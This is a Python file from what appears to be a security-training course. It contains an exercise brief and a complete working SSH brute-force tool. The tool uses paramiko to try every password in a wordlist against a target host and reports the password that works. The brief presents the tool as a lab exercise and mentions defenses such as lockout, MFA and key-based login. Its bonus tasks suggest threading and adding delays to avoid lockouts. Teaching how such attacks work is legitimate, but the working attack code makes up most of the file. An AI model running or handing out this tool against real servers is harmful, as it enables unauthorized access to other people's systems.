# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# EXERCISE 2: SSH BRUTE-FORCE TOOL
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
TOPIC: Credential Attacks / Authentication Bypass

BACKGROUND:
  SSH (Secure Shell) is used to remotely manage servers. Weak or default
  passwords are one of the most exploited vulnerabilities. Brute-forcing
  involves trying a list of common passwords systematically until one works.

  This exercise uses the `paramiko` library — a pure-Python SSH implementation.
  Install it with: pip install paramiko

  Real-world note: Most modern systems have rate limiting, account lockout,
  and fail2ban. This exercise shows WHY strong passwords + key-based auth matters.

LEARNING OBJECTIVES:
  1. Understand SSH authentication flow.
  2. Learn how to use paramiko for programmatic SSH connections.
  3. Understand credential stuffing vs brute force.
  4. Learn about defensive countermeasures (lockout, MFA, key auth).

CONCEPTS TO STUDY FIRST:
  - SSH protocol basics
  - paramiko: SSHClient, AutoAddPolicy, AuthenticationException
  - Wordlists (rockyou.txt is a famous password list)
  - What is "rate limiting" and "account lockout policy"?

TASK DESCRIPTION:
  Build an SSH brute-force tool that:
    a) Takes a target IP, username, and path to a password wordlist file.
    b) Attempts SSH login with each password in the wordlist.
    c) Stops and reports success when the correct password is found.
    d) Handles exceptions gracefully (auth failure, connection error, timeout).
    e) Displays attempt count and elapsed time.

STEP-BY-STEP INSTRUCTIONS:
  Step 1 — Import: paramiko, time, sys, datetime
  Step 2 — Write function `try_ssh_login(host, username, password, port=22)`:
            • Creates an SSHClient with AutoAddPolicy
            • Sets a connection timeout of 3 seconds
            • Calls client.connect(host, port, username, password)
            • Returns True on success, False on AuthenticationException
            • Returns None on socket/connection error
  Step 3 — Write function `brute_force_ssh(host, username, wordlist_path)`:
            • Opens the wordlist file and iterates line by line
            • Strips whitespace from each password
            • Calls try_ssh_login() for each password
            • Prints attempt number and current password being tried
            • Breaks and prints SUCCESS on True return
            • Prints summary (total attempts, time taken) at the end
  Step 4 — In `__main__`, accept command-line args (sys.argv) or input().
  Step 5 — Test with a wordlist containing the known password of your lab VM.

EXPECTED OUTPUT EXAMPLE:
  [*] Starting SSH brute force on 192.168.1.10 (user: admin)
  [~] Attempt 1: trying 'password'... failed
  [~] Attempt 2: trying 'admin123'... failed
  [~] Attempt 3: trying 'letmein'... failed
  [+] SUCCESS! Password found: 'letmein' (after 3 attempts, 4.2s)

CHALLENGE (BONUS):
  - Add threading to try multiple passwords concurrently.
  - Implement a delay between attempts to avoid lockouts.
  - Log failed attempts to a file.
"""

# YOUR CODE HERE FOR EXERCISE 2:



# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# EXERCISE 2: SSH BRUTE FORCE TOOL (CLEAN + STRUCTURED)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

import time

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False
    print("[!] paramiko not installed. Run: pip install paramiko")


# ─────────────────────────────────────────────
# FUNCTION 1: TRY SINGLE SSH LOGIN
# ─────────────────────────────────────────────
def try_ssh_login(host, username, password, port=22):

    if not PARAMIKO_AVAILABLE:
        return None

    client = paramiko.SSHClient()

    # Automatically accept unknown host keys (lab only)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=3,
            banner_timeout=5,
            allow_agent=False,
            look_for_keys=False
        )

        client.close()
        return True  # LOGIN SUCCESS

    except paramiko.AuthenticationException:
        return False  # WRONG PASSWORD

    except Exception as e:
        print(f"[!] Error: {e}")
        return None

    finally:
        client.close()


# ─────────────────────────────────────────────
# FUNCTION 2: BRUTE FORCE SSH
# ─────────────────────────────────────────────
def brute_force_ssh(host, username, wordlist_path, port=22):

    print("\n" + "=" * 60)
    print("SSH BRUTE FORCE TOOL")
    print(f"Target   : {host}:{port}")
    print(f"Username : {username}")
    print(f"Wordlist : {wordlist_path}")
    print("=" * 60)

    # Load password list
    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]

    except FileNotFoundError:
        print("[!] Wordlist file not found.")
        return None

    print(f"\n[*] Loaded {len(passwords)} passwords. Starting attack...\n")

    start_time = time.time()

    # Try each password
    for attempt_num, password in enumerate(passwords, 1):

        print(f"[~] Attempt {attempt_num}: trying '{password}'...", end=" ")

        result = try_ssh_login(host, username, password, port)

        if result is True:

            elapsed = time.time() - start_time

            print("\n\n[+] SUCCESS!")
            print(f"[+] Password found: {password}")
            print(f"[+] Attempts: {attempt_num}")
            print(f"[+] Time taken: {elapsed:.2f} seconds")

            return password

        elif result is False:
            print("failed")

        else:
            print("connection error")
            time.sleep(1)

    elapsed = time.time() - start_time

    print("\n[-] Attack finished. Password NOT found.")
    print(f"[-] Total attempts: {len(passwords)}")
    print(f"[-] Time taken: {elapsed:.2f} seconds")

    return None


# ─────────────────────────────────────────────
# MAIN PROGRAM
# ─────────────────────────────────────────────
if __name__ == "__main__":

    print("=== SSH BRUTE FORCE SIMULATION ===")

    host = input("Enter target IP: ")
    username = input("Enter username: ")
    wordlist = input("Enter wordlist path: ")

    brute_force_ssh(host, username, wordlist)